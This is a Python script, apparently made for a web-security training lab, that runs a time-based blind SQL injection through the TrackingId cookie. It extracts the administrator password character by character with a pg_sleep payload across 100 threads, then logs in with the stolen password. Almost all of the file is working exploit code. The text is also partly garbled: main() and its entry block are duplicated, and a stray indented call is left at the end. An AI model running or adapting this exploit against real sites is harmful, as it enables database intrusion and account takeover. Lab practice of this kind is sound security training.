import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

charset = 'abcdefghijklmnopqrstuvwxyz0123456789'

def get_cookies_with_requests(url):
    try:
        session = requests.Session()
        response = session.get(url)
        cookies = session.cookies.get_dict()
        tracking_id = cookies.get('TrackingId')
        return tracking_id
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")
        return None

def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find('input', attrs={'name': 'csrf'})
    if csrf_token:
        return csrf_token['value']
    return None

def try_password_char(base_url, tracking_id, position, char, time_delays):
    payload = f"'+||+(SELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTRING(password,+{position},+1)%3d'{char}')+THEN+pg_sleep({time_delays})+ELSE+pg_sleep(-1)+END+FROM+users)+||+'"
    cookies = {
        'TrackingId': tracking_id + payload,
    }
    response = requests.get(base_url, cookies=cookies)
    if response.elapsed.total_seconds() >= time_delays:
        print(f"Karakter ke-{position} benar: {char}")
        return char
    else:
        print(f"Karakter ke-{position} salah: {char}")
    return None

def bruteforce_password(base_url, tracking_id, threads, time_delays):
    password = ''
    for position in range(1, 21):
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(try_password_char, base_url, tracking_id, position, char, time_delays) for char in charset]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    password += result
                    break
    return password

def login(host, password):
    client = requests.Session()
    url = f"{host}login"
    csrf = get_csrf_token(client, url)
    if not csrf:
        print("Gagal mendapatkan CSRF token.")
        return False
    payload = {'csrf': csrf, 'username': 'administrator', 'password': password}
    r = client.post(url, data=payload, allow_redirects=True)
    if 'Your username is: administrator' in r.text:
        print("Login berhasil!")
        return True
    else:
        print("Login gagal.")
        return False

def main():
    base_url = input("Masukkan URL lab: ").strip()
    threads = 100  # Jumlah thread
    time_delays = 10  # Waktu delay (detik)
    tracking_id = get_cookies_with_requests(base_url)

    if tracking_id:
        print(f"TrackingId: {tracking_id}")
        password = bruteforce_password(base_url, tracking_id, threads, time_delays)
        print(f"\nPassword administrator yang ditemukan: {password}")
        login_condition = login(base_url, password)
    else:
        print("Gagal mendapatkan TrackingId.")

if __name__ == '__main__':
    main()

def main():
    base_url = input("Masukkan URL lab: ").strip()
    # threads = int(input("Masukkan jumlah threads: "))
    threads = 100
    # time_delays = int(input("Masukkan waktu delay (seconds): "))
    time_delays = 10
    tracking_id = get_cookies_with_requests(base_url)

    if tracking_id:
        print(f"TrackingId: {tracking_id}")
        password = bruteforce_password(base_url, tracking_id, threads, time_delays)
        print(f"\nPassword administrator yang ditemukan: {password}")
        login_condition = login(base_url, password)
    else:
        print("Gagal mendapatkan TrackingId.")

if __name__ == '__main__':
    main()

    main()
